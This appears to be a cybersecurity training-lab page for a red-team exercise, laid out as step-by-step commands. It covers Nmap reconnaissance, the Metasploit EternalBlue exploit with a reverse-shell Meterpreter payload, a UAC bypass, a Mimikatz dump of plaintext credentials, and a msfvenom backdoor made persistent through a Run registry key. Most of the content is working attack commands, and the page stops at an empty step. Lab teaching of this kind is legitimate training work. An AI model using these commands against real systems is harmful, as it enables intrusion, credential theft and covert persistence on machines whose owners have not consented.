Red Team Simulation#

Overview#

This lab immerses students in offensive cybersecurity operations by simulating real-world cyberattacks. Participants will emulate adversaries, exploit vulnerabilities, establish persistence, and escalate privilegesâ€”all while avoiding detection.

What You Will Learn#

  • Attack simulation & adversarial tactics
  • Privilege escalation & persistence techniques
  • Exploiting misconfigurations & security flaws
  • Bypassing endpoint security & evading detection
  • Using offensive security tools for post-exploitation

Lab Instructions#

1. Setting Up Your Environment#

You will need:

  • Kali Linux VM (VirtualBox, Proxmox, or AWS)
  • A vulnerable machine (TryHackMe, Metasploitable, or Windows 10 test VM)
  • Offensive security tools: Metasploit, Cobalt Strike (trial or Sliver), Mimikatz, PowerShell Empire

2. Initial Reconnaissance & Scanning#

Gather intelligence on the target system.

Step 1: Perform Network Discovery with Nmap#

nmap -sC -sV -A -p- <target-IP>

Step 2: Identify Open SMB & RDP Services#

nmap --script smb-enum-shares,smb-os-discovery -p 139,445 <target-IP>

nmap -p 3389 --script rdp-vuln-ms12-020 <target-IP>

ðŸ“Œ What this does: Finds exploitable SMB and RDP services.

3. Gaining Initial Access#

Step 1: Exploit SMB Using Metasploit#

msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target-IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your-IP>
exploit

ðŸ“Œ What this does: Uses the EternalBlue exploit to gain a Meterpreter shell.

4. Privilege Escalation#

Once inside the system, escalate privileges to Administrator or SYSTEM.

Step 1: Use Local Exploits#

use exploit/windows/local/bypassuac
set SESSION 1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

ðŸ“Œ What this does: Bypasses UAC to escalate privileges.

Step 2: Dump Credentials with Mimikatz#

load mimikatz
mimikatz_command -f sekurlsa::logonpasswords

ðŸ“Œ What this does: Extracts plaintext credentials from memory.

5. Establishing Persistence#

Step 1: Create a Reverse Shell Backdoor#

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your-IP> LPORT=4444 -f exe > backdoor.exe

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\\Users\\Public\\backdoor.exe"

Step 1: Scan for Other Network Hosts#
